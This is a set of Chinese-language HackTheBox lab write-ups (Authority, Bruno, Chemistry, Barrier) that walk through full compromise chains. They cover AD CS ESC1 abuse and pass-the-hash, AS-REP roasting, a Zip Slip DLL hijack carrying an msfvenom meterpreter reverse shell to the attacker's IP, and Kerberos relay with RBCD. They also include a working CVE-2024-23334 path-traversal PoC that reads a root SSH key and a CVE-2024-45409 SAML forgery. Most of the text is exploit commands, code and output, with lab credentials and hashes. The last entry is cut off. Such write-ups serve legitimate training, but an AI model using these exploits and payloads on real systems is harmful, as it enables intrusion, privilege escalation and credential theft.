LDAP Simple Bind，从明文流量里抓到凭据配置改成ldap://10.10.16.13:389，然后进行连接得到密码 certipy-ad find \ ░▒▓ INT ✘  04:23:18 上午  -u 'svc_ldap@authority.htb' \ -p 'lDaP_1n_th3_cle4r!' \ -dc-ip 10.129.164.154 \ -target authority.htb \ -enabled \ -vulnerable \ -stdoutCertipy v5.0.4 - by Oliver Lyak (ly4k)[*] Finding certificate templates[*] Found 37 certificate templates[*] Finding certificate authorities[*] Found 1 certificate authority[*] Found 13 enabled certificate templates[*] Finding issuance policies[*] Found 21 issuance policies[*] Found 0 OIDs linked to templates[*] Retrieving CA configuration for 'AUTHORITY-CA' via RRP[!] Failed to connect to remote registry. Service should be starting now. Trying again...[*] Successfully retrieved CA configuration for 'AUTHORITY-CA'[*] Checking web enrollment for CA 'AUTHORITY-CA' @ 'authority.authority.htb'[!] Error checking web enrollment: [Errno 111] Connection refused[!] Use -debug to print a stacktrace[*] Enumeration output:Certificate Authorities 0 CA Name : AUTHORITY-CA DNS Name : authority.authority.htb Certificate Subject : CN=AUTHORITY-CA, DC=authority, DC=htb Certificate Serial Number : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4 Certificate Validity Start : 2023-04-24 01:46:26+00:00 Certificate Validity End : 2123-04-24 01:56:25+00:00 Web Enrollment HTTP Enabled : False HTTPS Enabled : False User Specified SAN : Disabled Request Disposition : Issue Enforce Encryption for Requests : Enabled Active Policy : CertificateAuthority_MicrosoftDefault.Policy Permissions Owner : AUTHORITY.HTB\Administrators Access Rights ManageCa : AUTHORITY.HTB\Administrators AUTHORITY.HTB\Domain Admins AUTHORITY.HTB\Enterprise Admins ManageCertificates : AUTHORITY.HTB\Administrators AUTHORITY.HTB\Domain Admins AUTHORITY.HTB\Enterprise Admins Enroll : AUTHORITY.HTB\Authenticated UsersCertificate Templates 0 Template Name : CorpVPN Display Name : Corp VPN Certificate Authorities : AUTHORITY-CA Enabled : True Client Authentication : True Enrollment Agent : False Any Purpose : False Enrollee Supplies Subject : True Certificate Name Flag : EnrolleeSuppliesSubject Enrollment Flag : IncludeSymmetricAlgorithms PublishToDs AutoEnrollmentCheckUserDsCertificate Private Key Flag : ExportableKey Extended Key Usage : Encrypting File System Secure Email Client Authentication Document Signing IP security IKE intermediate IP security use KDC Authentication Requires Manager Approval : False Requires Key Archival : False Authorized Signatures Required : 0 Schema Version : 2 Validity Period : 20 years Renewal Period : 6 weeks Minimum RSA Key Length : 2048 Template Created : 2023-03-24T23:48:09+00:00 Template Last Permissions Owner : AUTHORITY.HTB\Administrator Full Control Principals : AUTHORITY.HTB\Domain Admins AUTHORITY.HTB\Enterprise Admins Write Owner Principals : AUTHORITY.HTB\Domain Admins AUTHORITY.HTB\Enterprise Admins Write Dacl Principals : AUTHORITY.HTB\Domain Admins AUTHORITY.HTB\Enterprise Admins Write Property Enroll : AUTHORITY.HTB\Domain Admins AUTHORITY.HTB\Enterprise Admins [+] User Enrollable Principals : AUTHORITY.HTB\Domain Computers [!] Vulnerabilities ESC1 : Enrollee supplies subject and template allows client authentication. 枚举发现易受攻击的模版:CorpVPN,查看其具体配置
https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf 具体原理查看条件:
低权限用户/组有注册证书权限 管理员审批被禁用 不需要授权签名 证书模板 DACL 里允许低权限主体注册Enrollee Supplies Subject : TrueClient Authentication : TrueRequires Manager Approval : FalseAuthorized Signatures : 0Enrollment Rights : AUTHORITY.HTB\Domain Computers 看权限是AUTHORITY.HTB\Domain Computers    ~/htb/AD/Authority ▓▒░ certipy-ad account create \ ░▒▓ ✔  9s   08:09:32 上午  -u 'svc_ldap@authority.htb' \ -p 'lDaP_1n_th3_cle4r!' \ -dc-ip 10.129.164.154 \ -user 'pwned$' \ -pass 'PwnedPass123!'Certipy v5.0.4 - by Oliver Lyak (ly4k)[*] Creating new account: sAMAccountName : pwned$ unicodePwd : PwnedPass123! userAccountControl : 4096 servicePrincipalName : HOST/pwned RestrictedKrbHost/pwned dnsHostName : pwned.authority.htb[*] Successfully created account 'pwned$' with password 'PwnedPass123!' 要先一个机器账户，然后利用账户申请 CorpVPN 模板，并把 UPN 伪造成 Administrator  ~/htb/AD/Authority ▓▒░ certipy-ad req \ ░▒▓ ✔  4s   08:10:20 上午  -u 'pwned$@authority.htb' \ -p 'PwnedPass123!' \ -dc-ip 10.129.164.154 \ -target authority.htb \ -ca 'AUTHORITY-CA' \ -template 'CorpVPN' \ -upn 'administrator@authority.htb' \ -dns 'authority.htb' \ -out administratorCertipy v5.0.4 - by Oliver Lyak (ly4k)[*] Requesting certificate via RPC[*] Request ID is 3[*] Successfully requested certificate[*] Got certificate with multiple identities UPN: 'administrator@authority.htb' DNS Host Name: 'authority.htb'[*] Certificate has no object SID[*] Try using -sid to set the object SID or see the wiki for more details[*] Saving certificate and private key to 'administrator.pfx'[*] Wrote certificate and private key to 'administrator.pfx' 得到administrator.pfx，使用该证书进行认证 ~/htb/AD/Authority ▓▒░ certipy-ad auth \ ░▒▓ ✔  4h 0m 2s   12:14:12 下午  -pfx administrator.pfx \ -dc-ip 10.129.164.154 \ -domain authority.htbCertipy v5.0.4 - by Oliver Lyak (ly4k)[*] Certificate identities:[*] SAN UPN: 'administrator@authority.htb'[*] SAN DNS Host Name: 'authority.htb'[*] Found multiple identities in certificate[*] Please select an identity: [0] UPN: 'administrator@authority.htb' (administrator@authority.htb) [1] DNS Host Name: 'authority.htb' (authority$@htb)> 0[*] Using principal: 'administrator@authority.htb'[*] Trying to get TGT...[*] Got TGT[*] Saving credential cache to 'administrator.ccache'[*] Wrote credential cache to 'administrator.ccache'[*] Trying to retrieve NT hash for 'administrator'[*] Got hash for 'administrator@authority.htb': aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed 得到管理员的hash，hash传递evil-winrm -i 10.129.164.154 -u Administrator -H 6961f422924da90a6928197429eea4ed

entry.content:

Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 158.24 seconds AS-REP Roasting发现21端口，尝试一下匿名用户 ftp $ip ░▒▓ ✔  2m 38s   08:10:19 上午  Connected to 10.129.238.9.220 Microsoft FTP ServiceName (10.129.238.9:zss): anonymous331 Anonymous access allowed, send identity (e-mail name) as password.Password: 230 User logged in.Remote system type is Windows_NT.ftp> ls229 Entering Extended Passive Mode (|||55898|)125 Data connection already open; Transfer starting.06-29-22 04:55PM <DIR> app06-29-22 04:33PM <DIR> benign06-29-22 01:41PM <DIR> malicious06-29-22 04:33PM <DIR> queue226 Transfer complete. 匿名用户登陆成功 cat changelog ░▒▓ ✔  08:30:37 上午  Version 0.3- integrated with dev site- automation using svc_scanVersion 0.2- additional functionality Version 0.1- initial support for EICAR string cat SampleScanner.runtimeconfig.dev.json { "runtimeOptions": { "additionalProbingPaths": [ "C:\\Users\\xct\\.dotnet\\store\\|arch|\\|tfm|", "C:\\Users\\xct\\.nuget\\packages" ] }}% 在改变日志中有个用户名svc_scan,还有个xct的用户尝试用AS-REP Roasting    ~/htb/medium/Bruno ▓▒░ GetNPUsers.py bruno.vl/svc_scan -no-pass -dc-ip 10.129.238.9 ░▒▓ INT ✘  08:38:37 上午  Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies [*] Getting TGT for svc_scan$krb5asrep$23$svc_scan@BRUNO.VL:836923787d837e9c1415ddf9bda0db46$ ▓▒░ hashcat -m 18200 -a 0 hash.txt /home/zss/rockyou.txt Sunshine1 成功抓取到hash值，破解hash，得到密码 ~/htb/medium/Bruno ▓▒░ nxc smb $ip -u svc_scan -p 'Sunshine1' --shares ░▒▓ INT ✘  08:48:50 上午  SMB 10.129.238.9 445 BRUNODC [*] Windows Server 2022 Build 20348 (name:BRUNODC) (domain:bruno.vl) (signing:True) (SMBv1:False) SMB 10.129.238.9 445 BRUNODC [+] bruno.vl\svc_scan:Sunshine1 SMB 10.129.238.9 445 BRUNODC [*] Enumerated sharesSMB 10.129.238.9 445 BRUNODC Share Permissions RemarkSMB 10.129.238.9 445 BRUNODC ----- ----------- ------SMB 10.129.238.9 445 BRUNODC ADMIN$ Remote AdminSMB 10.129.238.9 445 BRUNODC C$ Default shareSMB 10.129.238.9 445 BRUNODC CertEnroll READ Active Directory Certificate Services shareSMB 10.129.238.9 445 BRUNODC IPC$ READ Remote IPCSMB 10.129.238.9 445 BRUNODC NETLOGON READ Logon server share SMB 10.129.238.9 445 BRUNODC queue READ,WRITE SMB 10.129.238.9 445 BRUNODC SYSVOL READ Logon server share DLL劫持发现queue可以写 ~/htb/medium/Bruno ▓▒░ smbclient //$ip/queue -U "svc_scan%Sunshine1" ░▒▓ ✔  5m 0s   08:55:25 上午  Try "help" to get a list of possible commands.smb: \> put 123.txtputting file 123.txt as \123.txt (0.0 kb/s) (average 0.0 kb/s)smb: \> ls . D 0 Wed Mar 18 09:02:12 2026 .. D 0 Wed Jun 29 21:41:03 2022 123.txt A 8 Wed Mar 18 09:02:12 2026 4980479 blocks of size 4096. 577092 blocks availablesmb: \> ls . D 0 Wed Mar 18 09:02:23 2026 .. D 0 Wed Jun 29 21:41:03 2022 4980479 blocks of size 4096. 577074 blocks available 上传一个文件，发现过一会就消失了，可能与之前的SampleScanner文件有关，这是一些是 .NET Core / .NET 5+ 应用程序，我们反编译SampleScanner.dllhttps://github.com/dnSpy/dnSpy扫描 C:\samples\queue\ 里的文件，遇到 zip 就解压，然后根据文件里是否包含一个固定特征串，把文件分到 malicious 或 benign 目录符合特征串,复制到把路径里的 queue 替换成 malicious 后的新位置 { string destinationFileName = Path.Combine("C:\\samples\\queue\\", zipArchiveEntry.FullName); zipArchiveEntry.ExtractToFile(destinationFileName); } zipArchiveEntry.FullName 是压缩包里的原始路径如果是 ....\Windows\Temp\evil.txt那么 Path.Combine 后就可能把文件写到 queue 目录外,这是个Zip Slip我们可以尝试一下dll劫持,用Process Monitor来查看SampleScanner.exe的进程我们找的dll条件 1.搜索位置是可写/可控的2.会加载该dll的过滤一下看到Microsoft.DiaSymReader.Native.amd64.dll符合条件通过滥用 Path.Combine 所提供的任意文件写入漏洞，我们可以劫持Microsoft.DiaSymReader.Native.amd64.dll 来实现代码执行生成恶意dllmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.31 LPORT=6666 -f dll -o Microsoft.DiaSymReader.Native.amd64.dll import zipfilesource_dll = "Microsoft.DiaSymReader.Native.amd64.dll"target_path = "../app/Microsoft.DiaSymReader.Native.amd64.dll"with zipfile.ZipFile("payload.zip", "w") as zh: zh.write(source_dll, target_path)print("成功生成 payload.zip，内部指向: " + target_path)    ~/htb/medium/Bruno ▓▒░ ftp $ip ░▒▓ INT ✘  11:22:10 上午  Connected to 10.129.238.9.220 Microsoft FTP ServiceName (10.129.238.9:zss): anonymous331 Anonymous access allowed, send identity (e-mail name) as password.Password: 230 User logged in.Remote system type is Windows_NT.ftp> ls229 Entering Extended Passive Mode (|||55610|)125 Data connection already open; Transfer starting.06-29-22 04:55PM <DIR> app06-29-22 04:33PM <DIR> benign06-29-22 01:41PM <DIR> malicious03-21-26 03:21AM <DIR> queue226 Transfer complete.ftp> cd app250 CWD command successful.ftp> ls229 Entering Extended Passive Mode (|||55614|)125 Data connection already open; Transfer starting.06-29-22 05:42PM 165 changelog03-21-26 10:57AM 9216 Microsoft.DiaSymReader.Native.amd64.dll06-28-22 07:15PM 431 SampleScanner.deps.json06-29-22 03:58PM 7168 SampleScanner.dll06-29-22 03:58PM 174592 SampleScanner.exe06-28-22 07:15PM 170 SampleScanner.runtimeconfig.dev.json06-28-22 07:15PM 154 SampleScanner.runtimeconfig.json226 Transfer complete.ftp> msf > use exploit/multi/handler[*] Using configured payload generic/shell_reverse_tcpmsf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcppayload => windows/x64/meterpreter/reverse_tcpmsf exploit(multi/handler) > set LHOST 10.10.16.31LHOST => 10.10.16.31msf exploit(multi/handler) > set LPORT 6666LPORT => 6666msf exploit(multi/handler) > run[-] Handler failed to bind to 10.10.16.31:6666:- -[-] Handler failed to bind to 0.0.0.0:6666:- -[-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:6666).[*] Exploit completed, but no session was created.msf exploit(multi/handler) > run[*] Started reverse TCP handler on 10.10.16.31:6666 [*] Sending stage (203846 bytes) to 10.129.238.9[*] Meterpreter session 1 opened (10.10.16.31:6666 -> 10.129.238.9:55609) at 2026-03-21 11:22:35 +0800 拿到shell Kerberos Relay查看自身的权限 C:\Users\svc_scan\Desktop>whoami /allwhoami /allUSER INFORMATION----------------User Name SID ============== ==============================================bruno\svc_scan S-1-5-21-1536375944-4286418366-3447278137-1104GROUP INFORMATION-----------------Group Name Type SID Attributes =========================================== ================ ============ ==================================================Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled groupBUILTIN\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled groupBUILTIN\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled groupBUILTIN\Certificate Service DCOM Access Alias S-1-5-32-574 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\BATCH Well-known group S-1-5-3 Mandatory group, Enabled by default, Enabled groupCONSOLE LOGON Well-known group S-1-2-1 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled groupLOCAL Well-known group S-1-2-0 Mandatory group, Enabled by default, Enabled groupAuthentication authority asserted identity Well-known group S-1-18-1 Mandatory group, Enabled by default, Enabled groupMandatory Label\Medium Plus Mandatory Level Label S-1-16-8448 PRIVILEGES INFORMATION----------------------Privilege Name Description State ============================= ============================== ========SeMachineAccountPrivilege Add workstations to domain DisabledSeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set DisabledUSER CLAIMS INFORMATION-----------------------User claims unknown.Kerberos support for Dynamic Access Control on this device has been disabled. netexec ldap 10.129.238.9 -u 'svc_scan' -p 'Sunshine1' -M maqLDAP 10.129.238.9 389 BRUNODC [*] Windows Server 2022 Build 20348 (name:BRUNODC) (domain:bruno.vl)LDAP 10.129.238.9 389 BRUNODC [+] bruno.vl\svc_scan:Sunshine1MAQ 10.129.238.9 389 BRUNODC [*] Getting the MachineAccountQuotaMAQ 10.129.238.9 389 BRUNODC MachineAccountQuota: 10 检查一下ldap，发现ldap无需签名,而且MachineAccountQuota (MAQ) = 10在 AD 默认设置中，任何普通域用户都有权向域内加入最多 10 台计算机，这是进行 基于资源的约束性委派 (RBCD) 攻击的前提条件创建了一个用户 impacket-addcomputer bruno.vl/'svc_scan':'Sunshine1' -dc-ip 10.129.238.9 -computer-name 'HackerPC$' -computer-pass 'Password123!' C:\Windows\system32>powershell -c "[System.Security.Principal.SecurityIdentifier]::new((([ADSI]'LDAP://CN=HackerPC,CN=Computers,DC=bruno,DC=vl').objectSID).Value,0).Value"powershell -c "[System.Security.Principal.SecurityIdentifier]::new((([ADSI]'LDAP://CN=HackerPC,CN=Computers,DC=bruno,DC=vl').objectSID).Value,0).Value"S-1-5-21-1536375944-4286418366-3447278137-5101 查看其SID 通过 KrbRelay.exe 触发 DC 的身份认证，并将其 NTLM 认证中继回 LDAP 服务 既然目标 DC 已经“信任”了 HackerPC$，我们可以通过 S4U2Self 和 S4U2Proxy 协议，代表域管理员 Administrator 向 DC 请求服务票据 (ST) .\KrbRelay.exe -spn ldap/brunodc.bruno.vl -clsid d99e6e74-fc88-11d0-b498-00a0c90312f3 -rbcd S-1-5-21-1536375944-4286418366-3447278137-5101 -ssl -port 10246.\KrbRelay.exe -spn ldap/brunodc.bruno.vl -clsid d99e6e74-fc88-11d0-b498-00a0c90312f3 -rbcd S-1-5-21-1536375944-4286418366-3447278137-5101 -ssl -port 10246[*] Relaying context: bruno.vl\BRUNODC$[*] Rewriting function table[*] Rewriting PEB[*] GetModuleFileName: System[*] Init com server[*] GetModuleFileName: C:\Users\svc_scan\Desktop\KrbRelay.exe[*] Register com serverobjref:TUVPVwEAAAAAAAAAAAAAAMAAAAAAAABGgQIAAAAAAABTLDpDCi+4+oqPmcQHatTYAqAAAMRJ//8t8H66CBg3VSIADAAHADEAMgA3AC4AMAAuADAALgAxAAAAAAAJAP//AAAeAP//AAAQAP//AAAKAP//AAAWAP//AAAfAP//AAAOAP//AAAAAA==:[*] Forcing SYSTEM authentication[*] Using CLSID: d99e6e74-fc88-11d0-b498-00a0c90312f3[*] apReq: [*] bind: 0[*] ldap_get_option: LDAP_SASL_BIND_IN_PROGRESS[*] apRep1: 6f8188308185a003020105a10302010fa2793077a003020112a270046edcf7e0096372de04c5782ff37776c0d75a4d3e6ff6a78e70d024e85a26e2758564d58682f4eab9ad9b336e4d8f7b5696f251a867b906af11a57e02889d1098d69c882975c23d76deb9925b541b4f8a3fe32e1f82a2a0980c7ff56beee3a78b53358ea5515793c8491e0a3f67174b[*] AcceptSecurityContext: SEC_I_CONTINUE_NEEDED[*] fContextReq: Delegate, MutualAuth, UseDceStyle, Connection[*] apRep2: 6f5b3059a003020105a10302010fa24d304ba003020112a24404424416908eb0a193ad48ecb464f9ab42c06fe815d5ed0c47db9ee02daebb1620c3653be863f89a1fb860561cc5f5d850f37ef3267f15ee3b44a34a02c853a4e1846267[*] bind: 0[*] ldap_get_option: LDAP_SUCCESS[+] LDAP session established[*] ldap_modify: LDAP_SUCCESS impacket-getST -spn cifs/brunodc.bruno.vl -impersonate Administrator -dc-ip 10.129.238.9 'bruno.vl/HackerPC$:Password1' C:\Users\svc_scan\Desktop>export KRB5CCNAME=Administrator.ccache导入票据impacket-psexec -k -no-pass brunodc.bruno.vl
拿到flag

entry.title: HackTheBox - Chemistry
entry.content:
总结: 通过 Web 应用的文件上传功能触发服务端命令执行，拿到初始 Shell。 在应用数据库中恢复 rosa 密码并复用到 SSH，拿到稳定用户权限。 发现本地 8080 端口上的 aiohttp/3.9.1 服务。 利用 CVE-2024-23334 目录遍历读取 /root/.ssh/id_rsa。 通过 root 私钥 SSH 登录
信息收集扫描扫到22和5000端口 5000端口为一个web服务器
访问站点后可以注册并登录，说明这是一个面对普通用户开放的应用
<!-- more --> 反弹shell上传能弹shell的cil文件
成功弹到shell,先看系统上的本地用户 cat /etc/passwdcat /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:103:106::/nonexistent:/usr/sbin/nologinsyslog:x:104:110::/home/syslog:/usr/sbin/nologin_apt:x:105:65534::/nonexistent:/usr/sbin/nologintss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/falseuuidd:x:107:112::/run/uuidd:/usr/sbin/nologintcpdump:x:108:113::/nonexistent:/usr/sbin/nologinlandscape:x:109:115::/var/lib/landscape:/usr/sbin/nologinpollinate:x:110:1::/var/cache/pollinate:/bin/falsefwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologinusbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologinsshd:x:113:65534::/run/sshd:/usr/sbin/nologinsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologinrosa:x:1000:1000:rosa:/home/rosa:/bin/bashlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/falseapp:x:1001:1001:,,,:/home/app:/bin/bash_laurel:x:997:997::/var/log/laurel:/bin/false
在instance目录下找到数据库文件,然后直接用 sqlite3 查看 user 表： sqlite3 database.db.tablesSELECT * FROM user;
sqlite3 database.db.tablesstructure user SELECT * FROM user;1|admin|2861debaf8d99436a10ed6f75a252abf2|app|197865e46b878d9e74a0346b6d59886a3|rosa|63ed86ee9f624c7b14f1d4f43dc251a54|robert|02fcf7cfc10adc37959fb21f06c6b4675|jobert|3dec299e06f7ed187bac06bd3b670ab26|carlos|9ad48828b0955513f7cf0f7f6510c8f87|peter|6845c17d298d95aa942127bdad2ceb9b8|victoria|c3601ad2286a4293868ec2a4bc606ba39|tania|a4aa55e816205dc0389591c9f82f43bb10|eusebio|6cad48078d0241cca9a7b322ecd073b311|gelacia|4af70c80b68267012ecdac9a7e916d1812|fabian|4e5d71f53fdd2eabdbabb233113b5dc013|axel|9347f9724ca083b17e39555c36fd900714|kristel|6896ba7b11a62cacffbdaded457c6d9215|1|c4ca4238a0b923820dcc509a6f75849b在上述passwd看到app,rosa,和admin尝试破解rosa的密码
md5破解,得到密码unicorniosrosados
ssh连上.拿到user.txt CVE-2024-23334切到 rosa 后，先看本机开放服务： rosa@chemistry:~$ ss -tulnNetid State Recv-Q Send-Q Local Address:Port Peer Address:Port Process udp UNCONN 0 0 127.0.0.53%lo:53 0.0.0.0:* udp UNCONN 0 0 0.0.0.0:68 0.0.0.0:* tcp LISTEN 0 128 0.0.0.0:5000 0.0.0.0:* tcp LISTEN 0 128 127.0.0.1:8080 0.0.0.0:* tcp LISTEN 0 4096 127.0.0.53%lo:53 0.0.0.0:* tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:* tcp LISTEN 0 128 [::]:22 [::]:*
查看网络连接，内部8080可能部署着web服务端 curl -I http://localhost:8080HTTP/1.1 200 OKContent-Type: text/html; charset=utf-8Content-Length: 5971Date: Sun, 28 Sep 2025 03:00:40 GMTServer: Python/3.9 aiohttp/3.9.1
可以得知服务为aiohttp,去看这个版本是否有CVE漏洞。 利用ssh隧道转发更方便 ssh -N rosa@10.129.99.73 -L 8888:localhost:8080
一个站点监控,找aiohttp的漏洞 CVE-2024-23334的目录遍历漏洞 找到poc import argparseimport http.clientimport textwrapimport urllib def exploit(url, file, dir): parsed_url = urllib.parse.urlparse(url) conn = http.client.HTTPConnection(parsed_url.netloc) traversal = "/.." payload = dir for i in range(15): payload += traversal print(f'''[+] Attempt {i} Payload: {payload}{file} ''') conn.request("GET", f"{parsed_url.path}{payload}{file}") res = conn.getresponse() result = res.read() print(f" Status code: {res.status}") if res.status == 200: print("Respose: ") print(result.decode()) break if __name__ == "__main__": parser = argparse.ArgumentParser( description="PoC for CVE-2024-23334. LFI/Path-Traversal Vulnerability in Aiohttp", formatter_class=argparse.RawDescriptionHelpFormatter, epilog=textwrap.dedent(''' Usage: exploit.py -u http://127.0.0.1 -f /etc/passwd -d /static ''') ) parser.add_argument('-u', '--url', help="Aiohttp site url") parser.add_argument('-f', '--file', help="File to read") parser.add_argument('-d', '--directory', help="Directory with static files. Default: /static", default="/static") args = parser.parse_args() if args.url and args.file and args.directory: exploit(args.url, args.file, args.directory) print("Exploit complete") else: print("Error: One of the parameters is missing")
python '/home/xingguangqwq/Desktop/1.py' -u http://localhost:8888 -f /root/.ssh/id_rsa -d /assets[+] Attempt 0 Payload: /assets/../root/.ssh/id_rsa Status code: 404[+] Attempt 1 Payload: /assets/../../root/.ssh/id_rsa Status code: 404[+] Attempt 2 Payload: /assets/../../../root/.ssh/id_rsa Status code: 200Respose: -----BEGIN OPENSSH PRIVATE KEY----------END OPENSSH PRIVATE KEY-----Exploit complete
路径遍历读取任意文件 用ssh连接，成功拿到root

entry.title: HackTheBox - Barrier
entry.content:
信息收集 ~/htb/medium/barrier ▓▒░ nmap -p- --min-rate=10000 10.129.236.87 ░▒▓ ✔  8s   08:52:21 下午  Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-05 20:52 CSTNmap scan report for 10.129.236.87Host is up (7.8s latency).Not shown: 64582 filtered tcp ports (no-response), 949 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open http443/tcp open https8080/tcp open http-proxy9000/tcp open cslistener9443/tcp open tungsten-httpsNmap done: 1 IP address (1 host up) scanned in 29.17 seconds 扫描端口将10.129.236.87 barrier.vl gitlab.barrier.vl添加到/etc/passwd进入网址是一个登录框，注册一个账号后发现要通过管理员审核后才能使用爆破一下目录，在目录中，看到了akadmin用户名   ~/htb/medium/barrier ▓▒░ feroxbuster -u https://gitlab.barrier.vl/ -w /home/zss/SecLists-master/Discovery/Web-Content/big.txt -x bak,zip,tar.gz,sql,swp -t 50 --insecure ___ ___ __ __ __ __ __ ___|__ |__ |__) |__) | / ` / \ \_/ | | \ |__| |___ | \ | \ | \__, \__/ / \ | https://gitlab.barrier.vl/search/opensearch.xml200 GET 322l 904w 20258c https://gitlab.barrier.vl/explore404 GET 73l 163w 1591c https://gitlab.barrier.vl/explore.bak404 GET 73l 163w 1591c https://gitlab.barrier.vl/explore.zip404 GET 73l 163w 1591c https://gitlab.barrier.vl/explore.sql404 GET 73l 163w 1591c https://gitlab.barrier.vl/explore.swp200 GET 328l 866w 20744c https://gitlab.barrier.vl/satoru/200 GET 321l 905w 20292c https://gitlab.barrier.vl/explore/projects/
进入https://gitlab.barrier.vl/explore后,找到一个项目查看该库的历史可以得到一组凭据 CVE-2024-45409import requestsfrom urllib.parse import urljoinimport urllib3urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)def get_gitlab_repos(): base_url = 'https://gitlab.barrier.vl' api_url = urljoin(base_url, '/api/v4/') auth_data = { 'grant_type': 'password', 'username': 'satoru', 'password': 'dGJ2V72SUEMsM3Ca' } try: session = requests.Session() session.verify = False response = session.post(urljoin(base_url, '/oauth/token'), data=auth_data) response.raise_for_status() token = response.json()['access_token'] headers = {'Authorization': f'Bearer {token}'} projects_response = session.get(urljoin(api_url, 'projects'), headers=headers) projects_response.raise_for_status() projects = projects_response.json() print("Available repositories:") for project in projects: print(f"\nName: {project['name']}") print(f"Description: {project.get('description', 'No description available')}") print(f"URL: {project['web_url']}") print(f"Last activity: {project['last_activity_at']}") print("-" * 50) except requests.exceptions.RequestException as e: print(f"Error occurred: {str(e)}") if hasattr(e.response, 'text'): print(f"Response text: {e.response.text}") finally: session.close()if __name__ == "__main__": get_gitlab_repos() 登陆用satoru的身份登陆后有两个应用，gitlab为443端口上部署的应用guacamole为8080端口的服务，仔细看看没发现查看gitlab的版本为v17.3.2,发现登录启用ssohttps://github.com/synacktiv/CVE-2024-45409https://xz.aliyun.com/news/17068通过操纵 SAML 响应中的某些元素，绕过关键的安全检查，从而获得未经授权的访问 GET HTTP/2Host: gitlab.barrier.vl 用脚本来伪造akadmin用户    ~/htb/medium/barrier ▓▒░ python3 poc1.py -r response.xml -n akadmin -e -o response_patched.xml ░▒▓ ✔  17s   11:18:18 下午  [+] Parse response Digest algorithm: sha256 Canonicalization Method: http://www.w3.org/2001/10/xml-exc-c14n#[+] Remove signature from response[+] Patch assertion ID[+] Patch assertion NameID[+] Patch assertion conditions[+] Move signature in assertion[+] Patch response ID[+] Insert malicious reference[+] Clone signature reference[+] Create status detail element[+] Patch digest value[+] Write patched file in response_patched.xml 再对其进行编码成功登陆上Runners 页面显示当前存在一个在线的 Instance Runner，该 Runner 在线、使用 Docker 执行器 一个变量：AUTHENTIK_TOKENMqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTcAUTHENTIK_API_TOKEN=MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTchttps://api.goauthentik.io/clients/设置一下令牌，访问 Authentik 的用户接口 ~/h/m/barrier ▓▒░ curl -s -L 'http://barrier.vl:9000/api/v3/core/users/' -H 'Accept: application/json' -H "Authorization: Bearer $AUTHENTIK_API_TOKEN" | jq .{ "pagination": { "next": 0, "previous": 0, "count": 4, "current": 1, "total_pages": 1, "start_index": 1, "end_index": 4 }, "results": [ { "pk": 2, "username": "ak-outpost-af1fa701dddb44f98ddf2c3868733303", "name": "Outpost authentik Embedded Outpost Service-Account", "is_active": true, "last_login": null, "is_superuser": false, "groups": [], "groups_obj": [], "email": "", "avatar": "data:image/svg+xml;base64,", "attributes": {}, "uid": "2698567113c1ff76765c3baaa33db04c022784564d91d0c65ef03f41961282cf", "path": "goauthentik.io/outposts", "type": "internal_service_account", "uuid": "3737be82-3c55-4195-b639-478c339edb35" }, { "pk": 4, "username": "akadmin", "name": "authentik Default Admin", "is_active": true, "last_login": "2025-06-18T09:25:04.724776Z", "is_superuser": true, "groups": [ "a38fb983-8b71-4bf2-b5a7-42ab9fdd58e8" ], "groups_obj": [ { "pk": "a38fb983-8b71-4bf2-b5a7-42ab9fdd58e8", "num_pk": 21741, "name": "authentik Admins", "is_superuser": true, "parent": null, "parent_name": null, "attributes": {} } ], 